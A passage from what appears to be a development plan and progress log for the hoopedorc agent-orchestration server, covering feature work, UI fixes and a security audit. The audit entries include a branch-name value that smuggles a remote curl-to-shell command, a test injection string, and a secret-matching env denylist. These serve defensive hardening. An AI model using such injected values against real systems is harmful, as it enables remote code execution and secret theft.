wording ("`EngineRunner.checkModelQuota(modelId)`"): no internal state is
needed (unlike F6's cooldown Map), so it mirrors `checkBudget`'s existing
direct-lambda wiring rather than adding a redundant wrapper method, the
same kind of simplification F9 made for its own `SchedulerDeps` field.
New `SchedulerDeps.checkModelQuota?` hook consulted at **both** places
`checkBudget` already is: the dispatch loop (skip-don't-fail, new
`quotaBlockedWarned` Set following the exact
budget/cooldown/capacity warn-once pattern including the `.clear()`/
`.delete()` calls) and the retry/attempt path (requeue-to-backlog,
mirroring `checkBudget`'s own retry-path shape exactly, including that it
is **not** warn-once there — matching how the existing budget check
behaves at that site too). New checkbox-adjacent three-input row (window
hours / max runs / max cost) in `ModelsEditor.tsx` per model. Verified: new
engine unit test proves the warn fires exactly once across several polls
while a *different* task keeps the loop alive (not just trivially once,
which the naive first draft of this test would have shown regardless of
the dedup logic — a plain single-task version couldn't distinguish "warned
once" from "the loop only ever runs one pass," since budget/cooldown/quota
blocks don't set the `blockedByCapacity` flag that keeps `start()`'s loop
polling, unlike F12/B18's capacity check) — 32/32 engine tests green (1
new). Server-side: a standalone script against a real in-memory SQLite DB
(seeded via the actual `repo.createProject`/`createTask`/`createRun`/
`createCost` functions, not raw SQL) confirmed the real `checkModelQuota` +
`getModelUsageSince` window math for all four cases the plan asked for —
runs-limit reached, cost-limit under then over, and no-quota-configured —
plus an explicit assertion that out-of-window rows are excluded from the
count. Also live-verified `PUT /api/settings`'s new validation against a
real running server: a quota with a window but no limit → 400 with a clear
message; a valid quota → 200 and round-trips; a negative `maxRuns` → 400.
`npm run typecheck`/`npm run build` green across all workspaces.

F17 fixed: new `packages/server/src/db/backup.ts` — `runBackup(db, dbPath,
backupDir, keep)` uses better-sqlite3's own online-backup API
(`db.backup(destPath)`, confirmed as a real `Promise`-returning method by
reading the installed v11.10.0's actual implementation in
`node_modules/better-sqlite3/lib/methods/backup.js` before writing any
code, per the plan's explicit instruction — it also revealed a real
constraint worth knowing: the destination *directory* must already exist
or `db.backup()` throws, so `runBackup` `mkdirSync`s it first). Filenames
are `hoopedorc-YYYY-MM-DD-HHmm.db`; prunes to the newest `keep` afterward
by `mtime`. Skips entirely (no directory even created) when `dbPath` is
literally `":memory:"` — the caller in `main()` passes
`ENV.mock ? ":memory:" : ENV.dbPath`, matching exactly what `setupDb()`
itself used to open the DB. Wired into `main()` right next to the existing
log-pruning code, same on-boot-plus-daily `setInterval(...).unref()`
pattern, wrapped in a `.catch()` that only logs a warning — a failed
backup must never crash the server. New `DB_BACKUP_DIR` (default:
`<dirname(dbPath)>/backups`, computed once in `config.ts` alongside
`dbPath` itself so the default doesn't need recomputing at call sites) and
`DB_BACKUP_KEEP` (default 7) env vars, added to `.env.example`. Verified
against the real implementation two ways: (1) a standalone script against
a real file-based `better-sqlite3` DB (via `initDb`, not a reimplementation)
covering all three acceptance scenarios — a real backup file appears
matching the exact filename pattern; pre-seeding 9 dummy older files then
backing up again prunes to exactly 7 with the newest (including the
just-created real backup) surviving; an in-memory DB backup is skipped
with no directory created at all; (2) booted the actual built server
(non-mock, a real file DB) fresh and confirmed via its own log line and a
real `sqlite3 .tables` read against the produced file that a genuine,
schema-intact backup was written on boot. `npm run typecheck`/
`npm run build` green across all workspaces; `npm test -w @orc/engine`
(32/32) and `-w @orc/adapters` (4/4) unaffected (no engine/adapter changes).

F18 fixed: new `docs/specs/sandbox.md` — goals/non-goals, the
authenticated-CLIs-in-a-container problem (leads with F10's Keychain
finding: Claude Code's login lives in the macOS Keychain, unreachable from
a Linux container, so `ANTHROPIC_API_KEY` — billed per-token via the
Console, not a subscription's flat rate — is the only container-compatible
path for Claude; `opencode`'s file-based auth and `gh`'s native `GH_TOKEN`
support are more container-friendly, `GH_TOKEN`/`GITHUB_TOKEN` support
confirmed directly via `gh help environment` before writing it down), the
worktree mount model (bind-mount exactly `task.worktreePath`, nothing else
from the host — closing the current gap that nothing actually enforces
"one task can only touch its own worktree" beyond convention), a network
allowlist policy (target-repo host, the assigned model's specific
provider endpoint, and — a real tension worth flagging — package-registry
access for gate scripts that install deps at run time, so "no network at
all" doesn't cleanly work for the gates stage), env sanitization as two
layers (S5's existing host-side `sanitizedEnv()` denylist, plus a stricter
container-side allowlist built from scratch rather than forwarded from the
host), why gates are the easier half to containerize first (no CLI-auth
problem at all — plain `npm`/`execFile` calls), and a three-phase rollout
(gates-only → agents opt-in per model, starting with `opencode`'s simpler
auth story → agents default-on). Linked from F13's plan entry and from
`README.md`'s Security section, per the acceptance criteria. **No
implementation** — F13 remains future work; this is design only.

F19 fixed (last item — **closes Part 3 and the entire productization
plan**): new `ProjectConfig.schedule` (`ProjectSchedule`) — deliberately
simple cron-style auto-start, not real cron syntax, matching the plan's own
"deliberately dumb" framing: `enabled` + `mode: "interval" | "daily"`,
where `"interval"` needs `intervalHours` (1–720) and `"daily"` needs `hour`
(0–23)/`minute` (0–59) on the server's local clock. Validated on
`PATCH /api/projects/:id` the same way F15/F16 validate their own
`ProjectConfig` additions. New pure `packages/server/src/scheduler.ts`
`isScheduleDue(schedule, lastRunAt, now)` — kept as a standalone,
DB-free function so the date math is testable without booting a server;
"interval" fires once `now - lastRunAt >= intervalHours`, or immediately if
never run; "daily" fires only during the exact HH:MM minute *and* only
once per calendar day (guards against firing every poll during that
minute, or twice if the server restarts within it). New top-level
`Project.lastScheduledRunAt` (a real DB column via the standard `ALTER
TABLE` migration, deliberately **not** part of the `config` JSON blob a
Settings-style save would round-trip wholesale) tracks when the scheduler
last actually kicked off a run — kept as its own field specifically so a
human editing the schedule in the Advanced accordion and the scheduler's
own background write can never race each other. A new `setInterval` in
`main()` (~60s — fine enough resolution for HH:MM precision) iterates
every project, calls the existing `EngineRunner.start()` — the exact same
call the UI's Start button makes, no new dispatch mechanism — and only
stamps `lastScheduledRunAt` on an actual successful kickoff (`engine.start()`
throwing, e.g. a manual dispatch is in flight, doesn't consume the
schedule slot, so the next ~60s check retries instead of silently losing
that cycle until the next full interval/day). New Advanced-accordion
controls (`ProjectConfigFields.tsx`) — enable checkbox, a mode select,
and the relevant inputs. Verified: a standalone script exercising the real
`isScheduleDue` directly covered 13 cases (disabled/undefined schedules,
interval under/at/over its window plus a never-run-yet immediate-due case
plus an invalid-zero-hours case, and daily's exact-minute/wrong-minute/
wrong-hour/already-fired-today/fired-yesterday/missing-config cases) — all
passed. Live-verified end-to-end against a real running server: invalid
schedule configs (missing `hour`, a bad `mode`, an out-of-range
`intervalHours`) all correctly 400; a valid daily schedule round-trips
through `PATCH`; and — the real integration point — a throwaway project
(pointed at a nonexistent repo URL and an isolated scratch directory, kept
deliberately separate from anything that could touch this actual repo or
spend real model cost) with an immediately-due interval schedule was
picked up by the real ~60s scheduler tick, logged `"scheduled start:
<name>"`, and had `lastScheduledRunAt` populated — confirming the
scheduler genuinely calls the production `engine.start()` path, not a
reimplementation. `npm run typecheck`/`npm run build` green across all
workspaces; `npm test -w @orc/engine` (32/32) and `-w @orc/adapters` (4/4)
unaffected (no engine/adapter changes).

**This closes out Phase 8 — every item in Parts 1, 2, and 3 of this plan
(S1-S6, B1-B19, F1-F19) is now done.**

### Phase 9 — Part 4: post-plan audit fixes + UX wave — 🔄 in progress

| Item | Status | PR |
|---|---|---|
| A1 — concurrent 401s hang api() calls (TokenGate resolver clobbered) | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A2 — scheduled runs never showed status "running" / no WS broadcast | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A3 — daily schedules could silently skip a day (poll drift) | ✅ done | [#57](https://github.com/IngeniousArtist/hoopedorc/pull/57) |
| A4 — CHANGELOG had no 0.2.0 / Phase 7–8 entries | ✅ done | [#58](https://github.com/IngeniousArtist/hoopedorc/pull/58) |
| A5 — USER_GUIDE didn't cover quota/schedules/checks-gate/backups | ✅ done | [#58](https://github.com/IngeniousArtist/hoopedorc/pull/58) |
| U1 — no global "action required" indicator in the nav | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U2 — full ProjectHeader repeats on every project page | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U3 — Board's 8 columns overflow with no affordance | ✅ done | [#60](https://github.com/IngeniousArtist/hoopedorc/pull/60) |
| U4 — switching tabs silently discards unsaved Settings edits | ⬜ | |
| U5 — MissionControl elapsed label reads "42s ago elapsed" | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U6 — model-reassign dropdown on every kanban card | ⬜ | |
| U7 — schedules invisible outside the Advanced accordion; disable loses times | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U8 — headline costs render as "$0.0000" | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U9 — "New Project" is a nav tab though it's an action | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |
| U10 — dependency chips truncate with no way to see the full title | ✅ done | [#59](https://github.com/IngeniousArtist/hoopedorc/pull/59) |

A1–A3 were found by Fable's post-Phase-8 audit and fixed the same day (see
Part 4 below for the record); A4/A5 were fixed alongside Part 4 itself in
the docs PR that also restored this doc's accidentally-deleted "Part 1"
heading and overhauled the README. U1–U10 are the next implementation wave
— same workflow as every prior phase, work top-down. Split into two
batches (mirroring Phase 3's pattern): batch 1 (U1, U2, U5, U7, U8, U9 —
✅ done, PR #59; U10 needed no code change, already fixed) shipped the
lower-risk items; batch 2 (U3 — ✅ done, PR #60; U4, U6 still open) is the
remaining ones with more interaction-state complexity: Board column
collapse/dragover (done), cross-component Settings dirty tracking, moving
the model-reassign control.

U3 (PR #60) fixed: `Board.tsx` now tracks `expandedEmpty` (a
`Set<TaskStatus>` of columns a click or a drag has explicitly opened) and
`dragOverStatus` (the column currently being dragged over, if any). A
column collapses to a `w-9` vertical strip — rotated label + a "0" count
badge via `[writing-mode:vertical-rl] rotate-180` — whenever it has zero
tasks *and* isn't in either of those two sets; a column with any tasks is
never collapsed, full stop, regardless of set membership (so a column that
was manually opened while empty and then received a card can't glitch back
into a collapsed state later just because the set still has its status).
Clicking a collapsed strip — or its expanded-but-still-empty header, which
toggles the same way — flips its membership in `expandedEmpty`; dragging
over a collapsed strip sets `dragOverStatus` to that column, which swaps it
to the full expanded `<section>` in the same spot (same drop handler,
already attached) so the drop completes normally, then clears
`dragOverStatus` on drop/dragleave. Deliberately did not reorder columns
(collapsed ones stay in their original `TASK_STATUSES` position) or add any
new drag-and-drop mechanism — this only decides which of the two existing
render branches (slim strip vs. full section) a column takes. Verified:
`npm run typecheck`/`npm run build` green across all workspaces; `npm test
-w @orc/engine` (32/32) and `-w @orc/adapters` (4/4) unaffected (no
engine/adapter/server changes). Live-verified against `npm run mock`'s own
seed (the exact scenario the acceptance criteria names): at a 1280px
viewport, all 8 columns render with zero horizontal scroll — Backlog,
Ready, In Progress, and In Review expanded per the seed's 4 non-empty
statuses, Changes Req./Blocked/Done/Failed collapsed to strips. Click-to-
expand and click-to-recollapse both confirmed on the Blocked strip. The
drag-onto-collapsed-column path needed care to verify properly: Chrome's
native mouse-drag simulation doesn't reliably fire real HTML5 `dragstart`/
`dragover`/`drop` events, so it was tested by dispatching genuine
`DragEvent`s with a shared `DataTransfer` directly at the DOM nodes
(`element.dispatchEvent(new DragEvent(...))`) — the same technique used for
automated HTML5 drag-and-drop testing generally, and it exercises the
app's real bound handlers, not a reimplementation. This caught a bug in the
*test script* itself on the first attempt (dispatching `drop` on a stale
reference to the now-unmounted collapsed `<button>`, since it had already
swapped to the expanded `<section>` on `dragover` — fixed by re-querying
the live element before the `drop` dispatch) and separately surfaced two
pre-existing, unrelated server rules while picking test fixtures: B5's PATCH
validation only allows a manual drag to requeue a task to `backlog` or
`ready` (every other status is engine-assigned, confirmed via
`packages/server/src/index.ts`'s `"PATCH can only requeue a task to
\"backlog\" or \"ready\""` 400), and a task that's `in_progress`/`in_review`
rejects any PATCH with 409 (must Stop it first) — neither is new behavior,
both were hit incidentally when the first two test picks (an in-progress
task, then a backlog→changes_requested attempt) 409'd/400'd for reasons
having nothing to do with collapse. The clean, unambiguous proof came from
emptying Backlog by moving its one task to Ready (a valid transition,
succeeded 200), confirming Backlog auto-collapsed, then dragging a Ready
task onto the now-collapsed Backlog strip and confirming a 200 PATCH plus
the card actually landing in the (now re-expanded) Backlog column.

Batch 1 (PR #59) fixed: **U1** — new amber count badge on the
Notifications nav item (`App.tsx`) for notifications with
`requiresApproval` and no `respondedWith`; seeded once from
`GET /api/notifications` on mount, kept live off the same global
`notification` WS broadcast B15 already made reach every client regardless
of subscribed project (the handler now always upserts into a `notifications`
array — mirroring `Notifications.tsx`'s own WS reducer exactly — and only
conditionally fires the existing browser-notify call on `action_required`).
**U2** — `ProjectHeader` takes a `compact?: boolean` prop that skips the
budget editor and the Advanced accordion, rendering just the top row (name,
repo, status chip, schedule chip, Start/Pause/Stop); `App.tsx` passes
`compact={page !== "board"}`. **U5** — one-line fix in `MissionControl.tsx`:
strips the " ago" suffix off the reused `agoLabel()` output instead of
appending "elapsed" after it, so an active row reads "elapsed 2m 3s" instead
of "2m 3s ago elapsed" — `TaskCard.tsx`'s own `agoLabel` usage is untouched.
**U7** — new `formatSchedule()` helper renders the "⏱ daily 03:15" / "⏱
every 6h" chip on both ProjectHeader variants and the ProjectsView row;
separately, `projectConfigFromForm` no longer drops the whole `schedule`
object when the enable checkbox is off — it now emits
`{ enabled: false, ...times }` whenever the hour/minute or interval fields
are filled in, so disabling and saving no longer discards them (the
scheduler's `isScheduleDue` already checks `enabled` first, so a persisted
disabled schedule is inert). Live-verified the exact round-trip the bug
described: toggle off → save → reload the page → re-check "enabled" →
the same hour/minute reappear instead of blank inputs (confirmed via curl
that the server actually persisted `{enabled:false, hour:3, minute:15}`,
not an omitted field). **U8** — new shared `formatUsd()`
(`apps/web/src/lib/format.ts`): `>= $0.01` → 2 decimals, `> 0 and < $0.01`
→ 4 decimals, `0` → "$0.00"; applied only to the two headline spots the
plan named (CostView's "Total spend" tile, BoardSummary's "spent" line) —
per-task/per-run rows (CostView's "By task"/"By model", the avg-cost
caption) deliberately keep their existing 4-decimal `usd()` formatting.
**U9** — `new-project` removed from `App.tsx`'s `NAV` array (now 8 tabs);
a "+ New" button sits next to the project selector in the top row instead,
plus a visual divider between the project-scoped tabs (Board…Notifications)
and the global ones (Projects/Settings/Setup) — computed from
`PROJECT_PAGES` rather than a hardcoded index so the two lists can't drift
apart. **U10** — turned out to already be fixed: `TaskCard.tsx`'s
dependency chip has carried `title={dep.title}` since the F3/F4 era: no
code change, confirmed via a DOM inspection (`el.title`) since native OS
tooltips don't render in CDP screenshots.

All six live-verified together against one real (non-mock) server process,
seeded via the actual `repo.ts` functions (`createProject`/`createTask`/
`createCost`/`createNotification` — not raw SQL) into a scratch SQLite DB:
one project with an enabled daily schedule, a running task, a task blocked
on it (for U10's tooltip), and two notifications inserted *after* boot
specifically to dodge B10's boot-time `expireStaleApprovals` sweep (seeding
them before boot would have stamped them `expired_restart` before the badge
could ever see them as pending); a second project with real cost records
($1.23 + $0.0034) for U8's two precision tiers. `npm run typecheck` /
`npm run build` green across every workspace; `npm test -w @orc/engine`
(32/32) and `-w @orc/adapters` (4/4) unaffected — no engine/adapter code
touched this batch. One thing deliberately **not** live-verified: the
badge's WS-driven live decrement when a notification is actually responded
to. That requires a genuine in-flight engine approval (a real
`EngineRunner.pendingApprovals` resolver, private to the running server
process) — fabricating one safely was out of proportion for a UI-polish
batch, so this was reasoned from code instead: `respondNotification`'s
success path already broadcasts the updated notification globally (used and
verified since B15/F5), and the badge's handler is the same upsert-by-id
reducer `Notifications.tsx` has used and relied on since F5.

---

## Part 1 — Bugs & security (fix first, in this order)

### S1. Command injection via `execSync` string interpolation — CRITICAL — ✅ DONE (PR [#3](https://github.com/IngeniousArtist/hoopedorc/pull/3))

**Where:** `packages/engine/src/worktree-manager.ts` (7 call sites: lines ~40, 54, 69,
82, 87, 95, 213, 222, 240) and `packages/engine/src/validator.ts` (`getDiff`, ~line 107).

**Problem:** These build shell strings by interpolating `project.defaultBranch`,
`project.localPath`-derived paths, and branch names into `execSync("git … \"${x}\"")`.
`defaultBranch` and `localPath` are **user-controlled via the HTTP API**
(`POST /api/projects`, `PATCH /api/projects/:id`). Inside double quotes, `sh` still
performs `$(…)` command substitution, so a defaultBranch like
`main" $(curl evil.sh | sh) "` executes arbitrary commands. Combined with S2 (the API
is unauthenticated and CORS-open), this is a drive-by remote-command-execution vector.
Note `git-service.ts` already does this correctly with `execFile` + arg arrays — the
worktree manager and validator were never converted.

**Fix:**
1. Convert every `execSync` in `worktree-manager.ts` and `validator.ts` to
   `promisify(execFile)("git", [args…], { cwd })` — argument arrays, no shell. This
   also fixes the event-loop blocking (these sync calls freeze the server during
   fetch/worktree-add/diff; the codebase already migrated `git-service.ts` and
   `gate-runner.ts` for exactly this reason). `create()`, `remove()`, `changedFiles()`
   are already `async` so signatures don't change; `ValidatorImpl.getDiff` becomes
   async (await it in `review()`).
2. Belt-and-braces input validation in `packages/server/src/index.ts`:
   - `defaultBranch` must match `^[A-Za-z0-9._/-]+$` and must not start with `-`
     (reject with 400 otherwise) in both `POST /api/projects` and `PATCH`.
   - Reject any `repoUrl` that doesn't parse as `https://github.com/<owner>/<repo>`
     or `git@github.com:<owner>/<repo>` (it's passed to `gh --repo` and `git clone`;
     also prevents `-` flag-injection into git/gh).

**Acceptance:** grep shows zero `execSync(` under `packages/engine/`; creating a
project with `defaultBranch: 'main"; touch /tmp/pwned; "'` returns 400; typecheck,
build, engine tests green.

### S2. Unauthenticated API bound to 0.0.0.0 with reflect-any-origin CORS — CRITICAL — ✅ DONE (PR [#4](https://github.com/IngeniousArtist/hoopedorc/pull/4))

**Where:** `packages/server/src/index.ts` — `app.register(cors, { origin: true })`
(line ~243) and `app.listen({ port: ENV.port, host: "0.0.0.0" })` (line ~1290).

**Problem:** Anyone on the LAN — and, because CORS reflects every origin, **any
website open in the operator's browser** — can call every endpoint: read settings
(including the raw Telegram bot token, see S3), create/delete projects (which runs
`rm -rf` on disk, see S4), change merge policy to `fully_autonomous`, resolve
approvals, and start runs that spend real money and push code to GitHub. The
Tailscale-only deployment note in NEXT_STEPS doesn't protect a laptop on café wifi,
and CORS `origin: true` defeats even localhost-only binding.

**Fix (all three):**
1. **Bind host configurable, default loopback:** `ENV.host = process.env.HOST ?? "127.0.0.1"`
   in `config.ts`; use it in `app.listen`. Document `HOST=0.0.0.0` for tailnet/EC2 use.
2. **CORS allowlist:** default to the dev web origin(s)
   (`http://localhost:5173`, `http://127.0.0.1:5173`) plus an optional
   `ENV.corsOrigins` (comma-separated env `CORS_ORIGINS`). Never `origin: true`.
   (When the server later serves the built web app itself — F10 — same-origin makes
   CORS moot in production.)
3. **Optional bearer-token auth:** if `API_TOKEN` env (or a new
   `settings.apiToken`) is set, add a Fastify `onRequest` hook requiring
   `Authorization: Bearer <token>` on all `/api/*` routes except `/api/health`, and
   the same token as a `?token=` query param on the `/ws` upgrade. The web app reads
   the token from a login prompt stored in `localStorage` and sends it via
   `apps/web/src/api/client.ts` (add a header) and the `useWS` URL. Off by default
   (solo localhost use stays frictionless); required for any non-loopback HOST —
   refuse to start with `HOST != 127.0.0.1` unless a token is set or
   `ALLOW_UNAUTHENTICATED=1`.

**Acceptance:** server on defaults refuses connections from another machine; a fetch
from a random origin in the browser gets a CORS error; with `API_TOKEN` set, requests
without the header get 401, the web UI still works after entering the token.

### S3. Telegram bot token stored and served in plaintext — HIGH — ✅ DONE (PR [#5](https://github.com/IngeniousArtist/hoopedorc/pull/5))

**Where:** `settings.telegram.botToken` is saved raw in the settings JSON
(`repo.upsertSettings`) and returned verbatim by `GET /api/settings`; the Settings
page round-trips it (`apps/web/src/pages/Settings.tsx` lines ~470, 184). Whoever can
read the API (see S2) owns the bot — and the bot can approve risky merges.

**Fix:** Redact on read, write-only on save:
- In `GET /api/settings`, replace a present `botToken` with the literal
  `"__SET__"` sentinel (never the value).
- In `PUT /api/settings`, if the incoming `telegram.botToken` is `"__SET__"` or
  empty-and-previously-set, keep the stored value; otherwise overwrite.
- Settings UI: show a password field with placeholder "token saved — enter to
  replace", and stop echoing the token back into the input value.
- Same treatment for any future secret (`apiToken` from S2 item 3).
- Update the stale comment block at the top of `telegram.ts` (it still claims the
  token is "never stored raw" — it is, since the botToken field was added).

**Acceptance:** `curl /api/settings` never contains the real token; saving settings
without touching the token field leaves Telegram working; entering a new token
replaces it.

### S4. `rm -rf` on an arbitrary user-supplied path — HIGH — ✅ DONE (PR [#6](https://github.com/IngeniousArtist/hoopedorc/pull/6))

**Where:** `POST /api/projects` accepts `body.localPath` (any absolute path, `~`
expanded); `DELETE /api/projects/:id` then does
`rmSync(project.localPath, { recursive: true, force: true })` plus a sibling
`-wt-*` sweep (`index.ts` ~502–535). Creating a project with `localPath: "~"` and
deleting it wipes the home directory.

**Fix:**
1. On create: resolve and normalize the path; reject (400) if it is `/`, the home
   dir itself, not absolute after expansion, or contains `..`; reject if it is an
   ancestor of (or equal to) the server's CWD or `ENV.reposDir`. Require the path
   either not to exist yet or to be an empty directory or an existing clone whose
   `origin` matches `repoUrl` (a cheap `git remote get-url origin` check).
2. On delete: refuse the `rmSync` (skip cleanup, log a warning, still delete the DB
   rows) unless the directory contains a `.git` whose `origin` URL matches the
   project's `repoUrl`. Depth guard: also require `path.length > homedir().length + 1`.

**Acceptance:** creating a project with `localPath: "~"` or `"/"` returns 400;
deleting a project whose localPath was hand-edited to a non-clone directory leaves
the directory intact and logs a warning.

### S5. Spawned agents inherit the full server environment — MEDIUM

**Where:** both adapters (`packages/adapters/src/index.ts`) spawn `claude`/`opencode`
with `env: { ...process.env, PWD: opts.cwd }`; gate scripts (`gate-runner.ts`) and
`npm ci` (`worktree-manager.ts ensureDeps`) do the same. The server's env typically
holds `TELEGRAM_BOT_TOKEN` and any provider API keys from `.env` — and Claude runs
with `--permission-mode bypassPermissions`, so a prompt-injected or simply confused
agent (or any repo's `npm test` script — gates execute repo-controlled code by
design) can read and exfiltrate them.

**Fix:** build one `sanitizedEnv()` helper (new file `packages/adapters/src/env.ts`,
reused by engine via a copy or by passing env in `AgentRunOptions`): start from
`process.env`, delete keys matching
`/TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|TELEGRAM/i` except an allowlist the CLIs need
(`PATH`, `HOME`, `SHELL`, `TMPDIR`, `LANG`, `LC_*`, `NODE_*`, `npm_config_*`, plus
`ANTHROPIC_*` if present since Claude Code may need it). Use it for both adapters,
gate scripts, and `ensureDeps`. Document in README that gate scripts execute
repo-controlled code on the host, and that a container/sandbox mode is future work
(F13).

**Acceptance:** a task whose author prompt asks the model to `echo $TELEGRAM_BOT_TOKEN`
gets an empty value; agents and gates still run (verified by the seed-e2e harness).

### B1. "Stop" doesn't stop anything — the agent keeps running and spending — HIGH — ✅ DONE (PR [#8](https://github.com/IngeniousArtist/hoopedorc/pull/8))

**Where:** `POST /api/tasks/:id/stop` (`index.ts` ~906) only rewrites DB rows (run →
`stopped`, task → `blocked`). The actual child process lives in the Orchestrator's
`taskAbortControllers`, which the route never reaches. Worse, when the agent
finishes anyway, the pipeline continues (gates → validator → possibly **auto-merge**)
and overwrites the task status — the user pressed Stop and the PR merged anyway.

**Fix:**
1. `Orchestrator`: add `stopTask(taskId: string): boolean` — aborts the task's
   controller if present, marks the task id in a `stopRequested: Set<string>`, and
   `executeTask` checks that set at each stage boundary (after author run, after
   gates, before validator, before merge) and returns early with status `blocked`
   (emit a log line "stopped by user"). Clear the set entry in the `finally`.
2. `EngineRunner`: add `stopTask(projectId, taskId)` that forwards to the project's
   orchestrator (also look through the one-off orchestrators created by
   `dispatchOne` — see B3, which makes those tracked).
3. Route calls `engine.stopTask(...)` first; keep the DB writes as the fallback for
   when nothing is actually running. Also write an audit entry (`kind: "stopped"`,
   actor human).

**Acceptance:** dispatch a long task, hit Stop → the `claude`/`opencode` process is
gone within ~3s (SIGTERM→SIGKILL path already exists in `wireAbort`), the task ends
`blocked`, and nothing merges afterwards.

### B2. Run log history is unreadable after reload — every log row has `runId: ""` — HIGH — ✅ DONE (PR [#9](https://github.com/IngeniousArtist/hoopedorc/pull/9))

**Where:** every `onLog` emission in `orchestrator.ts` (lines ~522, 760, 811) and
`validator.ts` (~193) hardcodes `runId: ""`. The Board's history loader
(`Board.tsx` ~93–120) fetches runs, then `GET /api/runs/:id/logs` per run — which
matches nothing, so after a page reload the log panel is always empty; only live WS
logs ever show. The `runLogs` endpoint is effectively dead.

**Fix (choose the task-scoped route — simpler and matches how the UI thinks):**
1. Add `GET /api/tasks/:id/logs` (new `repo.getLogsByTask(db, taskId)`, indexed by
   the existing `task_id` column; add `LIMIT`/`?after=` paging — default last 1000).
   Register it in `ROUTES` in `@orc/types` and CONTRACT.md.
2. Board: replace the per-run log fan-out with one `taskLogs` call.
3. Keep writing `runId` properly anyway for future use: `executeTask` knows the
   attempt number, so pass `run-${task.id}-${task.attempts}` into the `onLog`
   payloads instead of `""` where a run exists (engine-level logs before the first
   attempt may keep `""`).

**Acceptance:** run a task, reload the page, select the task → historical logs appear.

### B3. Manual dispatch and the autonomous loop can double-run the same task — HIGH — ✅ DONE (PR [#10](https://github.com/IngeniousArtist/hoopedorc/pull/10))

**Where:** `EngineRunner.dispatchOne` builds a throwaway `Orchestrator` that is
**not** registered in `this.orchestrators`, so `engine.isRunning(projectId)` is
false while it runs. The `/dispatch` and `/retry` routes correctly refuse when the
autonomous loop is running — but the reverse is unguarded: pressing **Start** while
a manual dispatch is in flight boots the autonomous loop, whose orphan recovery sees
the task `in_progress` with no active run *in its own memory* and requeues it →
two agents on the same task, same branch name `orc/<taskId>`, same worktree path →
push rejections and interleaved commits.

**Fix:** track manual dispatches: keep a `Map<projectId, Set<taskId>> manualRuns` in
`EngineRunner`; `dispatchOne` registers/unregisters in a `finally`. `start()` returns
a 409-style error (throw; route surfaces it) if `manualRuns.get(project.id)?.size`.
Also expose the one-off orchestrator to `stopTask` (B1) via this map (store the
orchestrator instance, not just the task id).

**Acceptance:** while a manual dispatch runs, `POST /projects/:id/start` returns 409
with a clear message; after it finishes, start works.

### B4. Run rows are only written when a run *ends* — no live run, wrong duration — MEDIUM — ✅ DONE (PR [#11](https://github.com/IngeniousArtist/hoopedorc/pull/11))

**Where:** `Orchestrator.emitRunEvent` (orchestrator.ts ~820) is called once, after
the adapter returns, with `startedAt` = `endedAt` = now. So while an agent works
there is **no run row** (the `/dispatch` route papers over this with a fake
`placeholderRun` it never persists), run durations are always 0, and per-run cost
timing is wrong.

**Fix:** in `runAuthor`, emit a run event with `status: "running"`, real `startedAt`,
zero cost **before** `adapter.run(...)`; keep the terminal emit but preserve the
original `startedAt` (hold it in a local). `EngineRunner.onRunUpdated` already
upserts, so no server change is needed. Delete the `placeholderRun` blocks in
`/dispatch` and `/retry` and return the real run row (`repo.getRuns` after dispatch)
or just `{ task }` — update `@orc/types` responses accordingly and the two callers in
the web app.

**Acceptance:** during a run, `GET /api/tasks/:id/runs` shows a `running` row;
after completion the row's `endedAt - startedAt` matches wall-clock (>0).

### B5. `PATCH /api/tasks/:id` accepts any string as `status` — MEDIUM — ✅ DONE (PR [#12](https://github.com/IngeniousArtist/hoopedorc/pull/12))

**Where:** `index.ts` ~793: `if (body.status) updates.status = body.status` — no
validation against `TaskStatus`, no guard against nonsensical transitions (e.g.
setting a `done` task back to `in_progress` by hand, which orphan recovery will then
requeue and re-run, re-opening merged work).

**Fix:** validate `body.status` against the `TaskStatus` union (export a
`TASK_STATUSES` const array from `@orc/types/domain.ts` and reuse it in the Board's
column list too). Allow only human-meaningful transitions: anything →
`backlog`/`ready` (requeue), `in_progress` → nothing (409 — use Stop), `done` →
nothing (409 — use Rollback/Retry). Return 400 with the allowed set otherwise. Apply
the same enum check to `difficulty`/`role` if you add them to the PATCH body later.

**Acceptance:** `PATCH {status: "bogus"}` → 400; `PATCH {status: "ready"}` on a
failed task works; `PATCH {status: "in_progress"}` → 409.

### B6. `in_review` status exists but is never set — dead kanban column — LOW — ✅ DONE (PR [#14](https://github.com/IngeniousArtist/hoopedorc/pull/14))

**Where:** `domain.ts` defines `in_review` ("gates + validator running"); the
orchestrator never assigns it, so the Board column is permanently empty and the
user can't see which tasks are being validated (a phase that takes minutes).

**Fix:** in `executeTask`, set `task.status = "in_review"` +
`onTaskUpdated` right before the gates run, and back to `in_progress` when a retry
loop iterates (fix instructions path). Orphan recovery (`start()`) must treat
`in_review` like `in_progress` (requeue). `estimate.ts` already counts `in_review`
as pending — good. Check the Stop path (B1) handles `in_review` too.

**Acceptance:** while gates/validator run, the card sits in "In Review"; on a
gate-failure retry it moves back to "In Progress".

### B7. Planner passes the whole conversation as one argv — will hit E2BIG — MEDIUM

**Where:** `planner.ts runClaudeJson` spawns `claude -p <prompt>` with the full chat
transcript + prior-context inlined in a single argument; adapters do the same with
task prompts. macOS caps a single arg ~256KB and total argv ~1MB — a long planning
chat on a project with a fat PRD will start failing with a cryptic spawn error.

**Fix:** write the prompt to stdin instead: `claude -p --output-format json` reads
the prompt from stdin when `-p` is given no value (verify with `claude --help`; if
stdin isn't supported for `-p`, write the prompt to a temp file inside the cwd and
pass `-p "$(instructions to read file)"` — prefer stdin: change
`stdio: ["ignore", …]` to `["pipe", …]` and `proc.stdin.end(prompt)`). Do the same
for both adapters in `packages/adapters/src/index.ts` (`claude` and `opencode run`
both accept the prompt on stdin; for opencode, keep the message as the last CLI arg
only if stdin proves unsupported). Trim `buildPriorContext` task lists to the most
recent ~50 tasks as an extra bound.

**Acceptance:** a planning chat with a 300KB transcript completes; adapters still
pass the existing engine tests and the seed-e2e harness runs.

